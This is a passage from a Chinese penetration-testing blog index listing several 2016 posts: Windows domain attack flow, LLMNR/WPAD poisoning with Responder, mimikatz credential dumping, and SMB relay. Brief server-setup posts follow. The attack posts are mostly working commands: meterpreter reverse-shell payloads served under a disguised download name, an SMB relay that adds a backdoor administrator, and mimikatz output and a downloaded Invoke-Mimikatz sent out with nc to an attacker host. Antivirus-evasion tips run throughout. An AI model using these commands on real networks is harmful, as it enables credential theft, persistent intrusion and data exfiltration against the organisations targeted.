+<h3 id="关于域内用户数据漫游的设置"><a href="#关于域内用户数据漫游的设置" class="headerlink" title="关于域内用户数据漫游的设置:"></a>关于域内用户数据漫游的设置:</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">正常情况下,用户的环境配置文件会在用户注销时同时保存两份,一份在网络中指定的位置,一份在本地,这样就很方便用户在域中的其它机器上进行登录</div></pre></td></tr></table></figure>
+<h3 id="域内基本的策略管理"><a href="#域内基本的策略管理" class="headerlink" title="域内基本的策略管理:"></a>域内基本的策略管理:</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;另外,在域中还有个很重要的特性,就是统一的策略管理,也就是说,我可以针对一台或者几台域内的机器集中进行严格的策略控制,当一个机器加到域中以后,它就不再走本地的安全策略了,而是统一的走域安全策略,比如,你可以集中对一个或者几个组或者组织单元配置不同的安全策略,也就是说,你想让它干啥,它才能干啥(其实,这个秘密就发生在你加入域的那一刻,域控偷偷往你的本地管理组加了个域管理员账号,所以域管才能很随意的去操作域内的任意机器)</p>
+<h3 id="关于域的科普差不多就到这儿了-现在我们就来简单了解下域内的基本渗透流程"><a href="#关于域的科普差不多就到这儿了-现在我们就来简单了解下域内的基本渗透流程" class="headerlink" title="关于域的科普差不多就到这儿了,现在我们就来简单了解下域内的基本渗透流程:"></a>关于域的科普差不多就到这儿了,现在我们就来简单了解下域内的基本渗透流程:</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">务必先想办法拿到一个普通域内用户的密码[发信,钓鱼,随便] -&gt; 登陆到目标域中 -&gt; 尽你所能找到域管进程 -&gt; 抓取域管密码 -&gt; 定位域控 -&gt; 登到域控中导出域内所有hash留存备份 –&gt; 想办法维持住域管权限基本就可以收工了 -&gt; 上马准备下载资料</div></pre></td></tr></table></figure>
+<p><br></p>
+<h3 id="一点小结"><a href="#一点小结" class="headerlink" title="一点小结:"></a>一点小结:</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;虽然,暂时都是些非常基础的概念性的东西,但在后续的域内渗透过程中却无比重要,尤其当你在使用别人的工具(mimikatz,wce……之流)时,如果没有些基础概念做铺垫,是很难灵活运用的,更不要说去理解作者这样做的目的和好处,同样,对自己后续渗透思路的拓展,也是百害而无一利,不仅知其然,更要知其所以然嘛,包括后面加深对一些漏洞(ms14-068)的理解利用,都是如此,个人始终坚信,不管多么复杂的东西最终都是由基础慢慢堆积而来,尽自己的可能追溯到问题的本质自然是最好不过的,虽然可能会耗费你大量的时间和精力,但那却是值得的</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/07/23/llmnr-wpad/">
+                利用LLMNR协议进行常规win内网渗透的理解与实践
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-07-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/active-directory-pentest/">active directory pentest</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 由LLMNR协议引发的一系列中间人,在开始真正的内容之前,我们需要先来了解下,在同一内网环境下的windows机器之间的一些通信细节,当一台win机器向另一台win机器以域名[其实是机器名] 的形式请求相应的资源时,正常的通信流程如下<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">首先,windows会先去检查自己的主机配置文件[即常说的host文件,通常在C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\d</span>rivers<span class="symbol">\e</span>tc下],然后按照此文件事先配置好的指向进行解析</div><div class="line">当上面的步骤无法正确解析时,此时系统会自动去检查本地的dns缓存,按照缓存中的指向再进行解析,执行 ipconfig /displaydns 即可看到缓存内容</div><div class="line">如果连本地缓存也不能正确解析,它会继续向本地网络中的dns服务器去请求</div><div class="line">最后,如果本地网络中的dns也解析失败,它就会被交给LLMNR[链路本地多播名称解析]和netbios-ns去处理解析</div><div class="line"></div><div class="line">[netbios 即名称服务,专门用于同一内网下windows机器之间通过机器名相互访问,工作在会话层]</div></pre></td></tr></table></figure></p>
+<p>0x02 而基于LLMNR的中间人攻击,也就发生在上面流程的最后一步:</p>
+<p>假设现在有三台机器,A[正常的客户机],B[攻击者的机器],C[要访问的服务器],当A向C发起共享资源请求时,由于本地dns解析失败,正常情况下该请求会被交给LLMNR然后执行netbios查询,但不巧的是攻击者此时正在监听网络中的所有netbios查询请求,自然也就会捕捉到这条查询,当攻击者捕捉到该查询之后,它会告请求者也就是A,我[B]就是你要请求的那台服务器,接着A会把自己的账号密码提供给B认证,也就是说,此时B已经截获到了A的账号密码,一次简易的基于LLMNR中间人的攻击就这样被完成了,下面的流程图已经很好的说明了这一攻击过程<br><img src="/img/LLMNRs.png" alt="LLMNR"></p>
+<p>此时,我们再利用responder 来获取目标的smb hash,虽然不是明文,但我们可以配合类似hashcat的hash破解工具尝试破解该hash,当然,如果你有自己的GPU矩阵就再好不过了,或许很快就可以拿到对应的明文<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># responder -I eth0</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/RESPONESNDERS_I.png" alt=""><br>在C上,也就是我们的服务器上先创建一个共享目录<br><img src="/img/RESPONES_FTP.png" alt=""></p>
+<p>然后再回到A上通过smb进行访问<br><img src="/img/RESPONESNDERS_hash.png" alt=""></p>
+<p>此时,回到B上我们就轻松截获了A发来的登陆凭证<br><img src="/img/RESPONESNDERS_HSAHS_RE.png" alt=""><br><br></p>
+<p>0x03 说完netbios,我们再来说说WPAD,还是先大致了解下WPAD是个东西<br></p>
+<p>正常情况下,一些公司为了提高网络利用率,尽量减小带宽消耗,在内部一般都会采用代理服务器的方式来上网,这也就意味着公司内部的员工要想上网则需要把自己的系统代理地址设为公司代理服务器的地址,说了一大堆没用的,WPAD又是干什么的呢,说白点主要用它来查找网络中的wpad.dat文件的,有了该文件以后,客户端以后就会根据文件中的内容自动配置代理,但如何查找到这个文件的位置呢,一种方式可以通过dns查询,另一种方式是通过dhcp服务进行检索,还有就是利用LLMNR查询,我们确实是可以利用dns或者dhcp毒化,来操控流量指向,但这种方式很容易被拦截,而LLMNR则不一样,它是通过广播告诉同一内网下的所有windows,它就是wpad服务器,这样当你的浏览器设置为’自动检测代理设置’的情况下,它就会下载攻击者事先准备好的wpad.dat文件,这样一来,客户端的流量就会经过攻击者的机器,相信下面的图已经描述的非常清楚了<br><br><img src="/img/WPAD_ATTACK.jpg" alt=""></p>
+<p>利用responders获取内网明文密码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># responder -I eth0 -wFb</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/RESPONESNDERS_I_2.png" alt=""><br><img src="/img/RESPONESNDERS_clean.png" alt=""><br><img src="/img/RESPONESNDERS_IS.png" alt=""><br><img src="/img/RESPONESNDERS_pass.png" alt=""></p>
+<p>利用responder 在内网中伪造钓鱼页面批量挂后门 [内网社工也许会用得上]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">首先,准备好自己的马,这里我就暂时直接用msf来生成了,实际中,大家尽可能把自己的马伪装的好一点</div><div class="line">免杀是必须的,生成好以后把它放到我们的responder的files目录中</div><div class="line"></div><div class="line"><span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.5  LPORT=1234 -f exe -o /root/Desktop/shell.exe</span></div><div class="line"><span class="comment"># mv /root/Desktop/shell.exe /usr/share/responder/files/</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 编辑responder的主配置文件,开启下面的选项</span></div><div class="line"><span class="comment"># vi Responder.conf</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Serve-Always = On</div><div class="line">Serve-Exe = On </div><div class="line">HtmlFilename = files/AccessDenied.html</div><div class="line">ExeFilename = files/shell.exe     	指定我们刚刚生成的shell名称</div><div class="line">ExeDownloadName = ProxyClient.exe 	提示下载时所显示的名称,最好弄个成功率比较高的有诱惑性的名字</div><div class="line"><span class="string">`</span></div></pre></td></tr></table></figure>
+<p><img src="/img/RESPONESNDERS_HSAHS_backdoor.png" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># responder -I eth0 -wrf</span></div></pre></td></tr></table></figure>
+<p><img src="/img/RESPONESNDERS_HSAHS_shells.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_exec.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_send_shell.png" alt=""><br><img src="/img/RESPONESNDERS_HSAHS_backdoor_exec.png" alt=""><br></p>
+<p>利用responder进行smbrelay攻击 [后面可以连续提供多个用户名进行尝试,记得用空格分开即可]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#./SMBRelay.py -t 192.168.3.251 -c "net user vuln pass /ADD &amp;&amp; net localgroup administrators vuln /add" -t 192.168.3.5 -u Administrator</span></div></pre></td></tr></table></figure></p>
+<p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;相对于各类传统的中间人,类似的攻击,成功率相对来说可能会更高,关于responder的用法,这里只简单列举了一部分,观察到最新版的里面又加了很多貌似很好用的功能,抽空再续吧,另外,也期待大家能一起积极深入交流讨论<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/07/23/mimikatz-one/">
+                mimikatz 用法小记 [ 非交互抓取本地密码明文及hash ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-07-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/get-hash/">get hash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 非交互抓明文,即不在目标系统上留下任何文件,直接把抓取到的结果用nc发送到指定的远程机器[一般都是自己的vps]上,可能有些端口穿透性不太好,不妨多换几个常用的试试,如,80,8080,443,53……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit |  nc -vv 192.168.3.251 1234  在目标机器上执行</span></div><div class="line"><span class="comment"># nc -lvp 1234  本地[实际中通常都是在自己的vps上]机器执行</span></div></pre></td></tr></table></figure></p>
+<p>0x02 本地非交互抓明文,把抓取到的hash结果重定向到目标系统的指定文件中<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full""  exit &gt;&gt; shash.txt</span></div></pre></td></tr></table></figure></p>
+<p>0x03 有时候由于杀软的问题,直接在目标系统上抓可能需要免杀,这时我们就可以先利用procdump把lsass.exe进程中的数据导出到指定文件中 [可能会有点儿大],再把导出的文件下回到本地用mimikatz读取文件中的密码hash,以实现免杀效果,不过需要注意的是,本地读文件的系统平台和目标的系统务必完全一致<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">先在目标机器上执行:</div><div class="line"><span class="comment"># procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">把dmp文件下回到本地机器上执行[注意,本地机器的系统和目标系统务必要保持完全一致]:</div><div class="line"><span class="meta">#</span><span class="bash"> mimikatz.exe</span></div><div class="line"><span class="meta">#</span><span class="bash"> sekurlsa::minidump lsass.dmp</span></div><div class="line"><span class="meta">#</span><span class="bash"> sekurlsa::logonPasswords full</span></div></pre></td></tr></table></figure>
+<p>0x04 最后一种,在目标本地非交互抓hash的方式,利用powershell版的Mimikatz进行抓取,powershell本身就有一定的免杀效果,起码,目前为止对360杀毒是没有任何感觉的,但Nod基本是秒的,这个大家可以根据自己的实际情况而定,选择性使用<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" | nc -vv 192.168.3.28 1234</span></div><div class="line"><span class="comment"># nc -lvp 1234  本地[实际中通常都是在自己的vps上]机器执行</span></div></pre></td></tr></table></figure></p>
+<p>0x05 关于mimikatz 在域内网渗透中的更多实战用法,篇幅限制,待续……<br><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于mimikatz的更多细节,如果大家有兴趣想深入研究,在作者的博客上已经提供了该工具的源码,有能力请自行详读,另外,需要提醒一下凡是要涉及触及到系统底层的敏感操作,务必最少都要有管理员权限,抓hash自然也不例外,不出意外的情况下,我们在成功提权[获取system权限]以后的下一步操作一般就是抓hash,好啦,废话就不多说了,这些东西想必大家都已经非常熟练了<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/07/20/smb-replay-attack/">
+                smb重放攻击 [smb中间人]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-07-20</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/smb-attack/">smb attack</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 在演示smb重放攻击之前,我们还是需要先搞清楚ntlm的基本认证过程,因为smb登录基于这个,正常情况下,ntlm的简要认证详细流程如下:</p>
+<p><img src="/img/ntlm_auth.png" alt="ntlm认证过程"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">client端  &lt;-----&gt;  server端</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>,正常情况,当client端登陆时需要先输入username,password和domain[默认是.,表示本地],之后client端会自己计算出password用DES加密后的hash,并将此hash暂时保存在本地</div><div class="line"><span class="number">2</span>,接着,client端会将自己的username明文发送给DC[server]</div><div class="line"><span class="number">3</span>,此时,DC会生成一组<span class="number">8</span>字节的随机数,也叫challenge[挑战码],返回给client端</div><div class="line"><span class="number">4</span>,当client端在收到这个挑战码以后,会把先把它拷贝一份出来,然后再拿着这个挑战码和之前已经加密的密码hash再进行一次加密,加密后的东西叫response[响应],最后再将challenge,response和username一并发送给server端</div><div class="line"><span class="number">5</span>,server端在接收到client端传过来的这个三个值以后会将它们分别都转发给DC</div><div class="line"><span class="number">6</span>,DC在接收到username,response,challenge以后,会根据传过来的username,到自己的账号数据库中去查出来这个username所对应的hash,然后,再拿着这个hash和刚刚传过来的challenge再进行一次加密</div><div class="line"><span class="number">7</span>,最后,就剩比对了,把客户端传过来的response和在[<span class="number">6</span>]中最后加密的hash值进行对比,如果一致,ok,认证通过,登录成功,反之,则登录失败</div></pre></td></tr></table></figure>
+<p>0x02 下面,我们就来简单再现一下smb的整个重放攻击过程:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">client端  &lt;-----&gt; 攻击者 &lt;-----&gt;  server端</div></pre></td></tr></table></figure></p>
+<p>和上面的拓扑基本一致,只不过在此时,在client端和server端中间多了个攻击者,但双方在整个通信过程中都并不知道攻击者的存在,此时,我们本来正常的认证过程就变成了下面的样子:<br><img src="/img/SMBRelay-02.png" alt="重放过程"><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>,client端还是正常向服务端发送登录请求,由于client端此时并不知道攻击者的存在,它以为请求是发送给了server端,但实际上它是先发给了攻击者</div><div class="line"><span class="number">2</span>,然后攻击者再拿着这个username假装成client端发送给server端,此时server端正常返回一个challenge</div><div class="line"><span class="number">3</span>,攻击者拿到这个challenge以后再把它返回给client端</div><div class="line"><span class="number">4</span>,而client端拿到challenge在本地和自己的password DES加密以后,会把这个response再次发送给攻击者,此时client依然还以为攻击者就是server端</div><div class="line"><span class="number">5</span>,最后,攻击者会拿着client端发过来的这个response再把它交给server端去验证</div><div class="line"><span class="number">7</span>,server端此时到自己的数据库中一对比,发现hash一致,认证通过,登录成功,可见,一次简易的smb中间人攻击就这样被完成了</div></pre></td></tr></table></figure></p>
+<p>0x03 接着就来简单模拟下如何利用这种一攻击手法:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">首先,准备好三台机器,且在同一内网中,且已确保它们之间的通信没有任何问题</div><div class="line">受害者机器[win2008R2 en] 	<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.125</span></div><div class="line">攻击者机器[ubuntu <span class="number">16.04</span> LTS en]  <span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.136</span></div><div class="line">第三方机器[win2008R2 cn] 	<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.23</span></div></pre></td></tr></table></figure></p>
+<p>我们最终要达成的目的,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过smb重放攻击,获取目标机器(<span class="number">192.168</span>.<span class="number">3.125</span>)的meterpreter</div></pre></td></tr></table></figure></p>
+<p>在攻击者的机器上准备好下面的东西,生成并监听我们的马,下载安装impacket:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.136 LPORT=1234 -f exe -o /home/tools/shell.exe</span></div><div class="line">		</div><div class="line">msf  &gt; use exploit/multi/handler </div><div class="line">msf  &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">msf  &gt; set lport <span class="number">1234</span></div><div class="line">msf  &gt; set lhost <span class="number">192.168</span>.<span class="number">3.136</span></div><div class="line">msf  &gt; exploit -j</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip install pycrypto   安装依赖的加密库</span></div><div class="line"><span class="comment"># apt-get --reinstall install python-pyasn1 python-pyasn1-modules</span></div><div class="line"><span class="comment"># git clone https://github.com/CoreSecurity/impacket.git</span></div><div class="line"><span class="comment"># chmod -R 755 impacket</span></div><div class="line"><span class="comment"># cd impacket/</span></div><div class="line"><span class="comment"># python setup.py install</span></div><div class="line"><span class="comment"># cd examples/</span></div><div class="line"><span class="comment"># python smbrelayx.py -h   </span></div><div class="line">  -h 指定要攻击的机器</div><div class="line">  -e 当认证成功以后,指定要执行的文件,一般都是我们事先准备好的马</div></pre></td></tr></table></figure>
+<p>在第三方机器上执行如下命令,向攻击者传送smb流量,注意,我这里的账号密码其实就是192.168.3.125正确的系统账号密码:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net use \\192.168.3.136\c$ "lala!@#45" /user:"administrator"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/smbreplay_net_use.jpg" alt="往攻击机上执行net use"></p>
+<p>此时,当我们再回到攻击机上时就可以看到,当别人net use到攻击机上时,攻击者很轻易就捕捉到了smb 的登录凭证hash,然后,它又接着拿着这个hash到192.168.3.125[也就是我们的目标机器]去尝试登录,其实这就是所谓的重放,一旦登录成功,就会自动执行我们的马[类似我们用wmic远程执行代码]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python smbrelayx.py -h 192.168.3.125 -e /home/tools/shell.exe</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/smbreplay_hash.jpg" alt="重放过程"></p>
+<p>可以看到,当我们重放登录成功,文件就会被正常执行,meterpreter亦被正常弹回<br><img src="/img/smbreplay_meterpreter.jpg" alt=""><br><img src="/img/smbreplay_system.jpg" alt=""><br><img src="/img/smbreplay_ipconfig.jpg" alt=""></p>
+<p>我们现在可以再试下,如果此时net use的密码不对,又会出现什么样的状况,很显然,下面的结果已经说的很清楚了,尝试在192.168.3.125上重放时失败了,原因也已经很清楚了,密码不对,马自然也就执行不了,因为根本没法wmic<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net use \\<span class="number">192.168</span>.<span class="number">3.136</span>\c$ <span class="string">"a!@#45"</span> /<span class="symbol">user:</span><span class="string">"administrator"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/smbreplay_net_use_filai.jpg" alt=""><br><img src="/img/smbreplay_faiel.jpg" alt=""></p>
+<p><br></p>
+<p>过程中需要注意的一些点:<br>&nbsp;&nbsp;&nbsp;&nbsp;你可能一直在疑惑的是,受害者怎么会自己傻到<code>net use</code>到攻击者的机器上呢,没错,正常情况下肯定不会,如果想让同内网下别的机器上的流量流过自己,无非就是通过欺骗,因为smbrelayx本身并没有带类似的功能,所以,它并不能自动抓取内网中的所有smb流量,如果想让所有的流量都自动流过攻击者的机器,可能还需要配合Responder来一起实现,这里只是为了给大家看下攻击后的效果,所以,我的net use 就直接指向了攻击机,这样一来smb流量自然就能流过它[攻击机]了,当我们直接net use到攻击机时,其实我们的smb hash也会一并发送给它,然后脚本会拿着这个hash到目标机器上去认证,认证成功后即可执行我们的马,此时meterpreter正常弹回,如果认证失败,则不进行任何操作,注意,因为我这里只是测试,实际中你是几乎不可能指望别人直接net use到攻击机上的,还是那句话,这就需要你配合欺骗来一起利用,让所有的smb流量都经过你,然后抓取里面的登录凭证挨个到目标机器上去重放<br><br></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;单从攻击的原理上来讲,其实非常简单,也并非什么新技术,类似的重放不仅仅适用于内网,web也同样适用,言辞比较粗糙,只是想把原理尽量跟大家说明白,既然已经有人帮我们实现了这样的脚本,我们就省的自己重复造轮子了,后期还会单独说明如何配合Responder全自动定向攻击特定内网机器,细心的朋友可能会发现,smb中间人,似乎跟,hash传递,票据窃取……都是非常类似的攻击手法,至于漏洞危害个人觉得还是比较大的,尤其是在windows内网中[比如域],因为它不是靠漏洞来攻击的,基于这个思路演变出来的攻击手法其实还有非常多,任何能产生smb登录的条件你甚至都可以利用,篇幅原因就先说到这里吧,个人理解可能比较有限,欢迎大家一起来深入讨论,始终坚信,抛砖才能引玉<br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/06/27/HeightLNMP/">
+                centOS7_x64 + php7.1.9 + mysql 5.7.18 + nginx-1.12.1
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-06-27</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/env/">env</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<p>一、首先,部署nginx</p>
+<p>0x01 依旧接着我们之前准备好的系统继续,首先,将所有准备安装的软件包上传至服务器,软件包列表如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">libiconv-1</span><span class="selector-class">.14</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">mysql-5</span><span class="selector-class">.7</span><span class="selector-class">.18-linux-glibc2</span><span class="selector-class">.5-x86_64</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">nginx-1</span><span class="selector-class">.12</span><span class="selector-class">.1</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">php-7</span><span class="selector-class">.1</span><span class="selector-class">.9</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div></pre></td></tr></table></figure></p>
+<p>此次要实现的大致架构如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">centOS7</span> + <span class="selector-tag">php7</span><span class="selector-class">.1</span><span class="selector-class">.9</span> + <span class="selector-tag">mysql</span> 5<span class="selector-class">.7</span><span class="selector-class">.18</span> + <span class="selector-tag">nginx-1</span><span class="selector-class">.12</span><span class="selector-class">.1</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/06/27/HeightLNMP/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/06/26/HeightLAMP/">
+                centOS7_x64 +  httpd 2.4.27 + mysql 5.7.18 + php 7.1.9
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-06-26</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/env/">env</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>一、首先,部署apache</p>
+<p>0x01 关于centOS7的安装就不细说了,依然是最小化安装,只勾选必要的系统库及常用工具,务必记得先禁用selinux和系统防火墙,此次部署环境软件包如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">apr-1</span><span class="selector-class">.6</span><span class="selector-class">.2</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">apr-util-1</span><span class="selector-class">.6</span><span class="selector-class">.0</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">cronolog-1</span><span class="selector-class">.6</span><span class="selector-class">.2</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">httpd-2</span><span class="selector-class">.4</span><span class="selector-class">.27</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">libiconv-1</span><span class="selector-class">.14</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">mysql-5</span><span class="selector-class">.7</span><span class="selector-class">.18-linux-glibc2</span><span class="selector-class">.5-x86_64</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div><div class="line"><span class="selector-tag">php-7</span><span class="selector-class">.1</span><span class="selector-class">.9</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></div></pre></td></tr></table></figure></p>
+<p>要实现的架构大致如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">centOS7_x64</span> +  <span class="selector-tag">httpd</span> 2<span class="selector-class">.4</span><span class="selector-class">.27</span> + <span class="selector-tag">mysql</span> 5<span class="selector-class">.7</span><span class="selector-class">.18</span> + <span class="selector-tag">php</span> 7<span class="selector-class">.1</span><span class="selector-class">.9</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/06/26/HeightLAMP/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/06/26/php-inclusion-exploit/">
+                php 包含利用小记 [ RFI / LFI ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-06-26</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/inclusion/">inclusion</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 下面是常用的一些php包含函数,没列完,详细用法大家还是自己看手册吧,上面说的比较详细:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">inluce()</div><div class="line">inluce_once()</div><div class="line"><span class="keyword">require</span>()</div><div class="line">require_once()</div><div class="line">fopen() </div><div class="line">readfile()</div><div class="line">……</div></pre></td></tr></table></figure></p>
